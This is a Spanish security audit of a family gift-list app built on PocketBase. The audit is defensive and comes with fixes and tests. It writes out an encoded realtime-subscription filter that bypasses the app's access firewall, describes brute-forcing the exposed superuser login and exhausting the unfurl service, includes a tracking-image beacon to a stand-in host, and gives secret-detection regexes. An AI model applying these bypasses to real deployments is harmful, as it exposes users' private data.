# Auditoría de seguridad de Lazo

Fecha: 2026-11-11 · Alcance: `server/` (PocketBase 0.40.6, hooks, unfurl, Docker, Caddy), cliente (`src/api`, `public/sw.js`, `index.html`), CI y documentación.

**Método y límites.** Revisión estática del código y de las reglas contra la semántica de PocketBase ≥ 0.23 (código fuente de `apis/record_crud.go`, `apis/realtime.go`, `apis/record_helpers.go`, `apis/batch.go`). **No he podido ejecutar PocketBase en esta máquina** (no hay binario y Smart App Control bloquea los no firmados), así que ningún hallazgo está confirmado con una petición real. Para el hallazgo crítico R-1 incluyo una prueba lista para `server/test/rules.test.mjs` que lo confirma o lo descarta en CI. No se ha tocado código de la app.

## Resumen

| Severidad | N.º | Hallazgos |
|---|---|---|
| Crítico | 1 | R-1 |
| Alto | 2 | R-2, G-1 |
| Medio | 8 | R-3, G-2, G-3, G-4, G-5, G-6, G-7, G-8 |
| Bajo | 11 | R-4, R-5, R-6, G-9 … G-16 |

Lo más importante:

1. **R-1 (Crítico):** el cortafuegos de `_via_` se salta en tiempo real codificando el guion bajo (`%5Fvia%5F`) dentro de `?options=` del topic. X puede preguntar «¿tiene reservas mi regalo?, ¿de quién?, ¿cuánto han aportado?, ¿qué presupuesto tengo?» y también quién le regala en el amigo invisible.
2. **R-2 (Alto):** el enlace de invitación vale 30 usos y 14 días. X lo abre en una ventana privada, entra como «Tía Carmen» y ve su propia lista desde la segunda cuenta.
3. **G-1 (Alto):** Caddy tapa `/_/` pero no `/api/collections/_superusers/*`. El login de superusuario está en Internet con un límite de 30 intentos por segundo. Un superusuario lo ve todo.

---

# PARTE 1 — LA REGLA

## 1.1 Cómo se sostiene hoy

Dos piezas, y conviene tener claro cuál hace qué:

- **Reglas de API** (`1762850000_lazo.js:9-10`, `SEE_ITEM` y `SEE_LIST`) en `claims`, `contributions` y `budgets`. Protegen lectura directa, `expand`, recuentos y tiempo real, porque PocketBase evalúa la regla de la colección **de destino** en todos esos casos.
- **Cortafuegos `routerUse`** (`lazo.pb.js:6-17`). Es la **única** defensa contra filtros y ordenaciones por relaciones inversas. PocketBase **no aplica las reglas de la colección relacionada** cuando un filtro o un `sort` atraviesa una relación: hace el `JOIN` sin más (solo excluye campos `hidden` y, de serie, `@collection.` y `@request.` para no superusuarios). Sin el cortafuegos, `items?filter=claims_via_item.id!=""` sería un oráculo perfecto.

Desde las colecciones que X puede leer (`groups`, `lists`, `items`, `users`, `draws`, `assignments` propias) no hay ninguna relación **directa** hacia `claims`, `contributions` ni `budgets`: solo se llega con `_via_`. Por eso el diseño es correcto, pero todo depende de que el cortafuegos no tenga agujeros. Tiene uno.

## 1.2 Tabla de vías de fuga

| Vía | Estado | Por qué |
|---|---|---|
| `GET claims/contributions/budgets` (lista) | Cubierta | `listRule` = `SEE_ITEM`/`SEE_LIST`; para X no hay filas |
| Vista por id | Cubierta | `viewRule` falla → 404, igual que un id inexistente |
| `totalItems`, `perPage`, `skipTotal` | Cubierta | El recuento se hace con la regla ya aplicada |
| `fields=` | Cubierta | Solo recorta una respuesta ya autorizada |
| `expand` directo o encadenado (`item.list.group`) | Cubierta | Cada salto comprueba la `viewRule` del destino |
| `expand=claims_via_item` | Cubierta dos veces | Cortafuegos (403) y, aunque pasara, `viewRule` de `claims` |
| `filter`/`sort` con `_via_` en la URL | Cubierta | Cortafuegos; la descodificación (`+`→espacio y `decodeURIComponent` una vez) equivale a la de Go. La doble codificación no sirve porque Go descodifica una vez |
| `filter`/`sort` con `@collection` | Cubierta dos veces | Cortafuegos y bloqueo nativo de PocketBase a no superusuarios |
| `sort` por relación directa | Cubierta | No hay relación directa hacia datos secretos |
| **Realtime con `?options=` en el topic** | **NO cubierta → R-1** | El cuerpo no se descodifica |
| Realtime `claims/*` y `claims/ID` sin opciones | Cubierta | PocketBase evalúa `listRule`/`viewRule` por cliente y evento, también en borrados y cascadas |
| Batch API `/api/batch` | Cubierta (y hoy apagada) | No está activada en la migración. Si se activa: solo admite create/update/upsert/delete, las peticiones internas no pasan por `routerUse`, pero solo aceptan `expand` y `fields`, que van con regla. Ver G-15 |
| 400 frente a 404 | Cubierta | X recibe siempre 400 «Failed to create record.» al crear y 404 al ver/editar/borrar |
| Índice único `(item, user)` y `budgets(list)` | Cubierta | La `createRule` se comprueba **antes** de insertar; X nunca llega al índice |
| Hook de reservas («ya está reservado») | Cubierta | En ≥0.23 la `createRule` se evalúa antes de `onRecordCreateRequest`: X recibe 400 sin entrar al hook; y el hook comprueba al dueño antes de contar. Ver R-5 |
| Tiempos de respuesta | Cubierta en la práctica | X no llega a ninguna consulta que dependa de las reservas. Queda el borrado de un regalo con cascada (más lento si tiene reservas): diferencia de microsegundos, no explotable por red |
| Cascadas de borrado | Cubierta | Borrar un regalo propio siempre funciona y responde igual; los eventos de borrado de `claims` no llegan a X |
| X edita `quantity` de su regalo | Cubierta | No se valida contra lo reservado, y **así debe seguir**: un «no puedes bajar de 2» sería un oráculo |
| `items` con `updated`/contadores | Cubierta | `items` no tiene campos de fecha ni de estado |
| Mover un regalo a una lista de niño | Cubierta | `@request.body.list:isset = false`; los modificadores (`list+`) se resuelven antes de evaluar `:isset` en ≥0.23 |
| Cambiar `user`/`managers` de la lista | Cubierta | `:isset = false` en ambos |
| Colección `users` | Cubierta | Sin relaciones directas a secretos; `tokenKey` y `password` son `hidden` y no se pueden filtrar |
| Listas de niños | Según diseño | `user = ""` → todos ven el estado, también los padres |
| Managers | Cubierta | Un manager no puede convertirse en `user` ni al revés |
| **Endpoint `join`** | **NO cubierta → R-2** | Segunda identidad con el mismo enlace |
| **Baja de cuenta + volver a entrar** | **NO cubierta → R-3** | La lista queda con `user = ""` |
| Endpoints propios (`invite`, `draw`, `unfurl`, `device-*`) | Cubierta | Ninguno devuelve reservas, aportaciones ni presupuestos |
| Notificaciones | No aplica | No hay push en esta versión. Si se añade: enviar con la misma condición que `SEE_ITEM` y sin contenido en el cuerpo |
| Recuentos agregados | No aplica | No existe ningún endpoint ni campo agregado |
| Caché del service worker | Cubierta | `public/sw.js:7` excluye `/api/`, métodos no GET y otros orígenes |
| `localStorage` del cliente real | Cubierta | Solo guarda el token, el último grupo y ajustes; nunca respuestas |
| Modo demo | Cubierta | `DemoApi.listDetail` aplica `canSeeStatus`; los datos son de ejemplo y viven en el navegador (no es una frontera de seguridad, y no pretende serlo) |
| Imagen del regalo como baliza | Parcial → R-6 | X ve quién abre su lista, no el estado |
| Superusuario, copia de `data.db`, backups | Fuera de LA REGLA | Quien administra el homelab puede leerlo todo. Documentarlo |
| Deducción por ausencia | Inherente | «Marta ha comprado para todos menos para mí» se deduce mirando las otras listas |

## 1.3 Hallazgos

### R-1 · Crítico · El cortafuegos se salta en tiempo real codificando `_via_`

`server/pb/pb_hooks/lazo.pb.js:14-15`

La query string se descodifica, pero el cuerpo de `POST /api/realtime` se examina tal cual (`JSON.stringify(body)`). PocketBase, en cambio, trata cada suscripción como una URL: hace `url.Parse(topic)`, lee `options` con `Query().Get` (descodifica `%XX`) y luego `json.Unmarshal` (descodifica `\uXXXX`). Hay dos capas de codificación que el cortafuegos no deshace.

El filtro de las opciones se evalúa en `realtimeCanAccessRecord` con el mismo `RecordFieldResolver` que el listado, así que `_via_` funciona y **no** aplica las reglas de `claims`.

**Ataque.** X (dueño del regalo `A`):

```
GET  /api/realtime                      → clientId
POST /api/realtime   Authorization: <token de X>
{"clientId":"…","subscriptions":[
  "items/*?options=%7B%22query%22%3A%7B%22filter%22%3A%22claims%5Fvia%5Fitem.id%21%3D%27%27%22%7D%7D"]}
PATCH /api/collections/items/records/A  {"notes":"."}
```

Si llega el evento `update`, `A` tiene alguna reserva; si no llega, está libre. X dispara el evento cuando quiere editando su propio regalo. Cambiando el filtro:

- `claims_via_item.user = "ID_DE_MAMA"` → quién.
- `claims_via_item.status = "bought"` → si ya está comprado.
- `contributions_via_item.amountCents >= 3000` → importes, por bisección.
- Suscripción a `lists/*` con `budgets_via_list.amountCents >= N` → su presupuesto.
- Suscripción a `draws/*` **antes del sorteo** con `assignments_via_draw.giver = "ID" && assignments_via_draw.receiver = "MI_ID"` (una por candidato) → quién le regala en el amigo invisible.

La variante `"filter":"claims\\u005fvia\\u005fitem.id != ''"` (escape JSON dentro de `options`) pasa igual. Rompe LA REGLA entera con `curl`.

**Corrección.** El cliente no usa tiempo real con opciones (ni tiempo real, de momento), así que lo más corto y sólido es no aceptar opciones: lista blanca del formato del topic en el hook que PocketBase da para esto. Sustituir la línea 14 por un hook aparte:

```js
routerUse((e) => {
  if (e.auth && e.auth.isSuperuser()) return e.next();
  let probe;
  try {
    probe = decodeURIComponent(String(e.request.url.rawQuery || '').replace(/\+/g, ' '));
  } catch {
    throw new BadRequestError('Consulta no válida.');
  }
  if (/_via_|@collection/i.test(probe)) throw new ForbiddenError('Consulta no permitida.');
  return e.next();
});

// Tiempo real: solo «coleccion/*» o «coleccion/id». Sin ?options= no hay filter, sort ni expand que vigilar.
onRealtimeSubscribeRequest((e) => {
  if (!(e.auth && e.auth.isSuperuser())) {
    for (const s of e.subscriptions) {
      if (!/^[A-Za-z0-9_]+\/(\*|[A-Za-z0-9_]+)$/.test(String(s))) throw new ForbiddenError('Consulta no permitida.');
    }
  }
  e.next();
});
```

Ventajas frente a parchear la línea 14: no depende de comparar la ruta (`/api/realtime` frente a `/api/realtime/`), ni de adivinar cuántas veces descodifica PocketBase. Si algún día hacen falta opciones, permitir solo `fields`.

**Prueba para `server/test/rules.test.mjs`** (hoy no hay ninguna de tiempo real, ver R-4):

```js
async function realtime(token, subscriptions, trigger, ms = 800) {
  const ac = new AbortController();
  const res = await fetch(BASE + '/api/realtime', { signal: ac.signal });
  const reader = res.body.getReader();
  const dec = new TextDecoder();
  let buf = '';
  while (!/"clientId":"([^"]+)"/.test(buf)) buf += dec.decode((await reader.read()).value);
  const clientId = /"clientId":"([^"]+)"/.exec(buf)[1];
  const sub = await call('POST', '/api/realtime', { clientId, subscriptions }, token);
  let events = '';
  if (sub.status < 300) {
    await trigger();
    setTimeout(() => ac.abort(), ms);
    try {
      for (;;) {
        const { value, done } = await reader.read();
        if (done) break;
        events += dec.decode(value);
      }
    } catch { /* abortado */ }
  } else ac.abort();
  return { status: sub.status, events };
}

// dentro del test «su lista no le devuelve…»
const touch = () => ok('PATCH', `/api/collections/items/records/${A}`, { notes: 'x' }, t);
const opt = (o, hide) => 'items/*?options=' + hide(encodeURIComponent(JSON.stringify(o)));
for (const topic of [
  opt({ query: { filter: 'claims_via_item.id != ""' } }, (s) => s),
  opt({ query: { filter: 'claims_via_item.id != ""' } }, (s) => s.replace(/_/g, '%5F')),
  'items/*?options=' + encodeURIComponent('{"query":{"filter":"claims\\u005fvia\\u005fitem.id != \'\'"}}'),
]) {
  const r = await realtime(t, [topic], touch);
  assert.equal(r.status, 403, topic);
  assert.doesNotMatch(r.events, new RegExp(A), topic);
}
// y la suscripción normal a claims no trae nada de su lista cuando otro reserva/libera
```

Ejecutar esta prueba **antes** de aplicar la corrección: si la segunda y la tercera variante devuelven 204 y el evento llega, el hallazgo queda confirmado.

### R-2 · Alto · Segunda identidad con el mismo enlace de invitación

`server/pb/pb_hooks/lazo.pb.js:61` (`maxUses: 30`), `:56` (14 días), `:90-97` (alta sin sesión)

**Ataque.** El enlace se manda al grupo de WhatsApp de la familia. X ya ha entrado; lo abre en una ventana privada, escribe «Tía Carmen» y obtiene una cuenta nueva que es miembro del grupo y **no** es X. Desde ella ve reservas, compras, aportaciones y presupuesto de su propia lista. No hace falta saber nada técnico. Lo mismo vale para cualquiera a quien se reenvíe el mensaje durante 14 días, que además ve los nombres y años de nacimiento de los niños. Si X es admin puede generar enlaces a voluntad.

Solo lo delata que aparece una lista nueva en el grupo. No hay forma de expulsarla ni de anular el enlace (G-3).

Es un límite del modelo «enlace compartido», no un fallo de una regla, y no se elimina del todo: un admin siempre podrá invitarse a sí mismo. Se reduce así:

1. Enlaces de un uso por defecto, pocos usos como máximo y caducidad corta. En `invite`:

```js
const uses = Math.min(Math.max(parseInt(body.maxUses, 10) || 1, 1), 10);
const days = 3;
…
inv.set('maxUses', uses);
```

2. Revocar y expulsar (código en G-3).
3. Que la entrada se vea: guardar quién invitó (`invite.createdBy`) en la lista nueva y mostrar en el grupo «Carmen entró el 12/11 con el enlace de Alberto».
4. Decirlo en `SECURITY.md`: LA REGLA protege frente a la propia cuenta, no frente a una segunda cuenta en el mismo grupo.

### R-3 · Medio · Darse de baja deja la lista como «lista de niño»

`server/pb/pb_migrations/1762850000_lazo.js:18` (`users.deleteRule`), `:53` (`lists.user` sin cascada)

`lists.user` es una relación opcional sin `cascadeDelete`. Al borrar al usuario, PocketBase la vacía: la lista pasa a `user = ""`, que para `SEE_ITEM` significa «la ven todos».

**Ataque.** X no tiene reservas ni aportaciones propias (si las tiene, el borrado falla, ver G-11). Borra su cuenta con `DELETE /api/collections/users/records/<su id>`, vuelve a entrar con el enlace de invitación y ve las reservas hechas sobre su antigua lista, que sigue ahí con todos sus regalos. Es una variante de R-2 con el mismo requisito (un enlace vivo).

**Corrección.** Que la lista muera con la cuenta, y sus reservas con ella:

```js
rel('user', users, { cascadeDelete: true }),                    // lists.user  (línea 53)
rel('user', users, { required: true, cascadeDelete: true }),    // claims.user (97) y contributions.user (113)
rel('giver', users, { required: true, cascadeDelete: true }), rel('receiver', users, { required: true, cascadeDelete: true }), // assignments (158)
```

### R-4 · Bajo · Las pruebas dicen «por ninguna vía» y no prueban tiempo real ni `sort`

`server/test/rules.test.mjs:3-4, 106-111`

Se prueban `filter` y `expand` con `_via_`, pero no `sort=claims_via_item.id`, ni tiempo real (con y sin opciones), ni que al reservar otro miembro no le llegue el evento a X. R-1 habría salido. Añadir la prueba de R-1 y:

```js
assert.equal((await call('GET', `/api/collections/items/records?sort=${q('claims_via_item.id')}`, null, t)).status, 403, 'sort');
assert.equal((await call('GET', `/api/collections/items/records?filter=${q('claims_via_item.id != ""').replace(/_/g, '%5F')}`, null, t)).status, 403, 'filtro codificado');
```

### R-5 · Bajo · El hook de reservas depende del orden regla → hook

`server/pb/pb_hooks/lazo.pb.js:35-45`

Hoy es seguro: la `createRule` se evalúa antes de `onRecordCreateRequest`, así que solo llega al hook quien ya puede ver las reservas. Pero el hook, por sí solo, únicamente descarta al dueño: si ese orden cambiara en una versión futura, alguien de fuera del grupo con el id de un regalo distinguiría «ya está reservado» de «Failed to create». Dejarlo independiente del orden:

```js
const list = $app.findRecordById('lists', item.getString('list'));
const group = $app.findRecordById('groups', list.getString('group'));
if (!e.auth || list.getString('user') === e.auth.id || !group.getStringSlice('members').includes(e.auth.id))
  throw new ForbiddenError('No puedes reservar este regalo.');
```

Nota sobre la carrera que ya reconoce el comentario (`:42`): se cierra sin bloqueos recontando después de guardar.

```js
e.next();
const after = $app.findRecordsByFilter('claims', 'item = {:item}', '', 0, 0, { item: item.id }).reduce((s, c) => s + c.getInt('units'), 0);
if (after > item.getInt('quantity')) { $app.delete(e.record); /* el cliente ya recibió 200: refrescar al entrar */ }
```

### R-6 · Bajo · La imagen del regalo sirve de baliza

`server/pb/pb_migrations/1762850000_lazo.js:74`, `index.html:8` (`img-src https:`), `src/ui/Gift.tsx:29`

X pone como imagen `https://x.example/p.png?regalo=A`. Cada vez que alguien abre su lista, el servidor de X ve IP, hora y navegador. No revela reservas, pero sí quién mira y cuándo («alguien desde la IP de casa de mis padres abrió mi lista tres veces el Black Friday»). `referrerPolicy="no-referrer"` ya está, bien.

Corrección barata: aceptarlo y documentarlo. Corrección completa: que `unfurl` descargue la imagen una vez y se sirva desde PocketBase (campo `file`), con `img-src 'self' data: blob:`.

---

# PARTE 2 — Seguridad general

### G-1 · Alto · El login de superusuario está expuesto a Internet

`server/Caddyfile:11-13`, `server/pb/pb_migrations/1762850000_lazo.js:205-210`

El comentario dice que el panel no se publica, pero solo se tapa la interfaz (`/_/*`). `POST /api/collections/_superusers/auth-with-password` pasa por `reverse_proxy`. Además, al sustituir las reglas de límite se ha perdido la que PocketBase trae para `*:auth` (2 cada 3 s): queda `/api/` a 300 cada 10 s.

**Ataque.** Fuerza bruta de la contraseña del superusuario a 30 intentos por segundo desde cualquier sitio. Con ese token: todos los datos, LA REGLA incluida, suplantación de cualquier usuario y backups.

**Corrección.**

```
	@admin path /_ /_/* /api/collections/_superusers /api/collections/_superusers/* /api/settings* /api/logs* /api/backups* /api/crons*
	respond @admin 404
```

y en la migración:

```js
{ label: '*:auth', maxRequests: 2, duration: 3, audience: '' },
```

### G-2 · Medio · Los límites de peticiones cuentan a todo el mundo como una sola IP

`server/pb/pb_migrations/1762850000_lazo.js:203-211`

No se configura `trustedProxy`, así que PocketBase ve siempre la IP del contenedor de Caddy. Todos los clientes comparten cubo.

**Ataque.** Cualquiera manda 10 `POST /api/lazo/join` por minuto con tokens falsos y nadie de la familia puede unirse ni usar un código de dispositivo. Con 30 peticiones por segundo deja la API entera en 429. Y al revés: el límite por atacante no existe.

**Corrección** (Caddy, expuesto directamente, sobrescribe `X-Forwarded-For` con la IP real):

```js
s.trustedProxy.headers = ['X-Forwarded-For'];
s.trustedProxy.useLeftmostIP = false;
```

### G-3 · Medio · No se puede expulsar a nadie ni anular un enlace

`server/pb/pb_migrations/1762850000_lazo.js:44` (`members:isset = false`), `lazo.pb.js:47-68`; spec §5.1 líneas 94 y 97; `SECURITY.md:21`

La spec y `SECURITY.md` prometen «revocable» y «expulsar a alguien». El campo `revoked` existe y `join` lo consulta, pero nada lo pone a `true`, y `members` no se puede tocar por API. Un intruso que entra con un enlace reenviado se queda hasta que alguien edite la base de datos a mano. `SECURITY.md` dice además «128 bits»; son 32 caracteres de 62 símbolos, unos 190 bits (el dato real es mejor que el documentado).

**Corrección.**

```js
routerAdd('POST', '/api/lazo/invite-revoke', (e) => {
  const group = $app.findRecordById('groups', String(e.requestInfo().body.group || ''));
  if (!group.getStringSlice('admins').includes(e.auth.id)) throw new ForbiddenError('Solo quien organiza el grupo.');
  for (const inv of $app.findRecordsByFilter('invites', 'group = {:g} && revoked = false', '', 0, 0, { g: group.id })) {
    inv.set('revoked', true);
    $app.save(inv);
  }
  return e.json(200, { ok: true });
}, $apis.requireAuth('users'));

routerAdd('POST', '/api/lazo/expel', (e) => {
  const body = e.requestInfo().body;
  const group = $app.findRecordById('groups', String(body.group || ''));
  const who = String(body.user || '');
  if (!group.getStringSlice('admins').includes(e.auth.id) || who === group.getString('owner')) throw new ForbiddenError('No puedes expulsar a esa persona.');
  $app.runInTransaction((tx) => {
    for (const col of ['claims', 'contributions'])
      for (const r of tx.findRecordsByFilter(col, 'user = {:u} && item.list.group = {:g}', '', 0, 0, { u: who, g: group.id })) tx.delete(r);
    for (const l of tx.findRecordsByFilter('lists', 'user = {:u} && group = {:g}', '', 0, 0, { u: who, g: group.id })) tx.delete(l);
    group.set('members-', who);
    group.set('admins-', who);
    tx.save(group);
  });
  return e.json(200, { ok: true });
}, $apis.requireAuth('users'));
```

Tras expulsar, revocar también los enlaces del grupo.

### G-4 · Medio · Una sesión robada no caduca nunca y no se puede cerrar

`server/pb/pb_migrations/1762850000_lazo.js:19-20`, `src/api/pocketbase.ts:22-24`, `lazo.pb.js:113-143`

El token dura 180 días y `authRefresh` da otro de 180 cada vez. No hay «cerrar sesión en todos los dispositivos». El token vive en `localStorage`.

**Ataque.** Móvil perdido, o alguien convence a la abuela de que le dicte el código de 8 caracteres: sesión completa, renovable sin fin, y nadie puede cortarla.

**Corrección.**

```js
routerAdd('POST', '/api/lazo/logout-all', (e) => {
  e.auth.refreshTokenKey(); // invalida todos los tokens emitidos
  $app.save(e.auth);
  return $apis.recordAuthResponse(e, e.auth, 'rotate'); // este dispositivo sigue dentro
}, $apis.requireAuth('users'));
```

El código de dispositivo en sí está bien: 40 bits, 10 minutos, un uso, hash en reposo, mismo mensaje para todos los fallos. Con G-2 corregido, 10 intentos por minuto e IP lo hacen inviable. Faltan dos detalles: borrar los códigos caducados (se acumulan) y un límite para `POST /api/lazo/device-code` (`{ label: 'POST /api/lazo/device-code', maxRequests: 5, duration: 60, audience: '@auth' }`).

### G-5 · Medio · Quien organiza puede fijar el amigo invisible

`server/pb/pb_hooks/lazo.pb.js:146-189`

«Nadie (ni quien organiza) ve las asignaciones ajenas» se cumple al leer, pero no al sortear.

**Ataque.** El admin manda hasta 200 exclusiones que dejan un único reparto posible: conoce todas las parejas. O repite el sorteo hasta que le toca quien quiere (cada sorteo borra el anterior sin dejar rastro). Las exclusiones quedan visibles en `draws`, pero nadie las mira.

**Corrección** (tras calcular `participants` y `exclusions`):

```js
const uniq = [...new Set(participants)];
const banned = new Set(exclusions.flatMap(([a, b]) => [a + '>' + b, b + '>' + a]));
const min = Math.min(3, uniq.length - 1);
if (uniq.some((g) => uniq.filter((r) => r !== g && !banned.has(g + '>' + r)).length < min))
  throw new BadRequestError('Demasiadas exclusiones: cada persona necesita al menos 3 destinatarios posibles.');
```

Y un contador `round` en `draws` que suba en cada sorteo y se enseñe a todos («sorteo n.º 3»). Con 3 participantes cada uno deduce el reparto entero: avisarlo en la interfaz.

### G-6 · Medio · `server/data/` no está en `.gitignore` y no hay `.dockerignore`

`.gitignore`, `server/docker-compose.yml:15,44`, `server/Dockerfile:6`

Los volúmenes son `./data/pb` y `./data/caddy`, es decir `server/data/`. Se ignora `server/pb/pb_data/`, que no es donde escribe compose.

**Ataque.** Un `git add -A` desde el homelab sube `data.db` (toda la familia, niños incluidos, y las claves de firma de tokens) y las claves TLS de Caddy. gitleaks no detecta un SQLite. Además `COPY . .` mete `.env` y `server/data` en las capas de build.

**Corrección.** Añadir `server/data/` a `.gitignore` y crear `.dockerignore`:

```
.git
.env
.env.*
node_modules
dist
dist-demo
server/data
test-results
```

### G-7 · Medio · `lists.deleteRule` no exige sesión ni pertenecer al grupo

`server/pb/pb_migrations/1762850000_lazo.js:63`

`user = "" && managers ?= @request.auth.id`. PocketBase trata `""` y `NULL` como iguales, y un array vacío en `?=` produce una fila nula: para un visitante **sin sesión**, `managers ?= ""` es cierto si `managers` está vacío.

**Ataque.** Una lista huérfana (R-3: dueño dado de baja, `user = ""`, `managers = []`) la borra cualquiera sin autenticar que conozca su id, por ejemplo un exmiembro. También puede borrar una lista de niño un manager que no sea del grupo (la `createRule` no exige que los managers sean miembros).

**Corrección.**

```js
deleteRule: `${AUTH} && group.members ?= ${ME} && user = "" && managers ?= ${ME}`,
```

Como norma, empezar **todas** las reglas por `${AUTH} &&`: es gratis y elimina esta clase de sorpresa con valores vacíos (`lists.createRule`, `items.*`, `budgets.*`, `claims.deleteRule`, `contributions.deleteRule`).

### G-8 · Medio · `unfurl` no tiene tiempo total: un servidor lento lo retiene indefinidamente

`server/unfurl/fetch.mjs:44-52, 88`

`timeout: remaining` es tiempo de **inactividad** del socket. El plazo de 6 s solo se mira al empezar cada salto.

**Ataque.** Un miembro (o una tienda maliciosa enlazada) responde un byte cada 5 segundos. La descarga no termina nunca: PocketBase se rinde a los 10 s, pero el socket y el búfer siguen vivos en `unfurl`. A 20 peticiones por minuto se agotan memoria y descriptores.

**Corrección** en `once()`:

```js
const kill = setTimeout(() => req.destroy(new UnfurlError('timeout')), remaining);
req.on('close', () => clearTimeout(kill));
```

El resto del anti-SSRF está bien resuelto: la IP validada es la que se usa para conectar (`lookup` propio, se rechaza si **alguna** IP devuelta es privada), las IP literales en decimal, hexadecimal u octal las normaliza `new URL`, las redirecciones se revalidan una a una (máximo 3), solo puertos 80 y 443, sin credenciales, sin `Accept-Encoding` (no hay bomba de compresión), 1,5 MB, clave comparada en tiempo constante y servicio sin puertos publicados. `allowPrivate` no es alcanzable por HTTP.

### G-9 · Bajo · Rangos IPv6 sin bloquear

`server/unfurl/guard.mjs:21-30`

Faltan `::/96` (IPv4-compatible, p. ej. `[::7f00:1]`), `64:ff9b:1::/48` (NAT64 local), `2002::/16` (6to4), `2001::/32` (Teredo) y `fec0::/10`. En una red normal no enrutan a nada interno, pero es una línea cada uno:

```js
['::', 96], ['64:ff9b:1::', 48], ['2001::', 32], ['2002::', 16], ['fec0::', 10],
```

### G-10 · Bajo · Detalles de `join` y del hook de grupos

`server/pb/pb_hooks/lazo.pb.js:84-109, 20-32`

- La comprobación de `uses`/`revoked` está fuera de la transacción: dos altas simultáneas pueden pasar de `maxUses`. Releer la invitación con `tx.findRecordById('invites', invite.id)` y comprobar dentro.
- `e.auth` puede ser un superusuario: `if (user && user.collection().name !== 'users') throw new ForbiddenError(...)`.
- Un usuario con sesión puede cambiar su `name` por API sin el límite de 40 (`users.updateRule`): añadir `max: 40` al campo o validar en un hook. Puede llamarse igual que otro miembro.
- En el hook de grupos, la lista se crea **después** de `e.next()`, cuando la respuesta ya se ha enviado y fuera de la transacción: si falla, queda un grupo sin lista. Usar el hook de modelo, que corre dentro de la transacción:

```js
onRecordCreate((e) => {
  e.next();
  const owner = e.app.findRecordById('users', e.record.getString('owner'));
  const list = new Record(e.app.findCollectionByNameOrId('lists'));
  list.set('group', e.record.id);
  list.set('name', owner.getString('name'));
  list.set('user', owner.id);
  e.app.save(list);
}, 'groups');
```

### G-11 · Bajo · Ajustes de `users`

`server/pb/pb_migrations/1762850000_lazo.js:14-21`

- `authAlert` sigue activado: en el segundo dispositivo PocketBase intenta mandar un correo a `u-…@lazo.invalid`. `users.authAlert.enabled = false;`
- Darse de baja falla con un error genérico si la persona tiene reservas o aportaciones (relación obligatoria sin cascada). Se arregla con R-3.
- Si se da de baja el dueño, el grupo queda sin `owner` ni admins y nadie puede invitar ni borrarlo. Impedirlo en un `onRecordDeleteRequest` de `users` o traspasar la propiedad.

### G-12 · Bajo · Contenedores y cadena de suministro

`server/docker-compose.yml`, `server/Dockerfile:2,9,12`, `server/unfurl/Dockerfile`, `.github/workflows/ci.yml`

Bien: `no-new-privileges` en los tres, usuario sin privilegios, `unfurl` en solo lectura y sin puertos, red `interna` con `internal: true`, Caddy fijado por digest. Mejoras:

- `cap_drop: [ALL]` en los tres (Caddy necesita `cap_add: [NET_BIND_SERVICE]`); `read_only: true` también en PocketBase; `pids_limit` y `mem_limit` en `unfurl`.
- PocketBase está en `publica` y por tanto sale a Internet sin necesitarlo. Una red `frontal` con `internal: true` entre Caddy y PocketBase lo evita.
- El zip de PocketBase se descarga sin comprobar el hash (Dockerfile y CI): añadir `echo "<sha256>  /tmp/pb.zip" | sha256sum -c -`.
- `node:24-alpine` y `alpine:3.22` sin digest; las acciones de GitHub por etiqueta (`@v5`, `gitleaks-action@v2`) en vez de por SHA.

### G-13 · Bajo · CSP y cabeceras

`index.html:8`, `server/Caddyfile:3-10`

La CSP es buena (`script-src 'self'`, `object-src 'none'`, `form-action 'none'`, `base-uri 'self'`) y no hay `innerHTML` en el cliente. Tres detalles:

- Solo va en `<meta>`: no cubre `frame-ancestors` ni las respuestas de la API. Enviarla también desde Caddy con `frame-ancestors 'none'`, y añadir `Cross-Origin-Opener-Policy "same-origin"`.
- `connect-src` admite cinco proveedores de IA y `img-src https:` cualquier host: si hubiera un XSS, son canales de salida para el token de `localStorage`. Es el precio de la IA en el cliente; documentarlo.
- `src/ui/screens/ItemSheet.tsx:144` usa `href={item.url}` tal cual. El validador de PocketBase y la CSP paran `javascript:`, pero cuesta una línea comprobar `/^https?:\/\//i` antes de pintar el enlace.

### G-14 · Bajo · gitleaks en local es opcional

`.githooks/pre-commit`

El hook solo actúa si alguien ejecutó `git config core.hooksPath .githooks`, y sin gitleaks instalado el patrón de reserva no detecta `UNFURL_KEY` (hex de 64) ni tokens de PocketBase (`eyJ…`). Añadir a `package.json` `"prepare": "git config core.hooksPath .githooks"` y al patrón `|eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}|UNFURL_KEY=[0-9a-f]{32,}`. CI sí lo cubre con historial completo.

### G-15 · Bajo · La importación usa la batch API, que está apagada

`src/api/pocketbase.ts:89-95`

No es de seguridad: `createBatch()` devolverá 403 porque la migración no activa `batch`. Si se activa (`s.batch.enabled = true; s.batch.maxRequests = 50;`), trocear las 300 filas en lotes de 50. Para LA REGLA es inocuo (ver tabla), pero conviene saber que las peticiones internas del lote **no pasan por `routerUse`**: cualquier control futuro que viva solo en ese middleware no las verá.

### G-16 · Bajo · Datos de menores

Sin cuenta, sin foto, nombre y año opcional: correcto. Riesgos reales, ya descritos: los ve cualquiera que entre con un enlace reenviado (R-2, G-3), están en claro en `server/data/pb` y en sus backups (G-6), y los ve el superusuario (G-1). Los registros de PocketBase guardan IP y URL de cada petición 7 días; para una app familiar se puede poner `s.logs.logIP = false`.

---

## Uso de la API de JSVM

No he encontrado ninguna llamada mal usada: `routerUse`, `e.request.url.rawQuery`, `e.requestInfo().body`, `e.auth.isSuperuser()`, `$apis.requireAuth('users')`, `$apis.recordAuthResponse(e, record, método, meta)`, `findRecordsByFilter(col, filtro, sort, limit, offset, params)`, `runInTransaction`, `set('members+', id)` y los `:isset` (que desde 0.23 ven los modificadores ya resueltos) son correctos. Tres matices:

1. `onRecordCreateRequest` se ejecuta **después** de la `createRule`. Lo que el hook fija (`units = 1`, `owner`, `members`) no participa en la regla. Hoy no afecta, pero no se puede escribir una regla que dependa de un valor que pone el hook.
2. Lo que va tras `e.next()` en un hook `…Request` ocurre con la respuesta ya enviada y fuera de la transacción (G-10).
3. El filtro de tiempo real no pasa por la query string ni por una sola capa de codificación: el sitio correcto para vigilarlo es `onRealtimeSubscribeRequest` (R-1).

## Orden de trabajo propuesto

1. R-1 (prueba, luego hook) y R-4.
2. G-1 y G-2: dos líneas en Caddy y tres en la migración.
3. R-2 y G-3: usos, caducidad, revocar, expulsar.
4. R-3, G-7, G-6.
5. El resto.

---

## Revisión v0.3 (plazas, hucha, entrega)

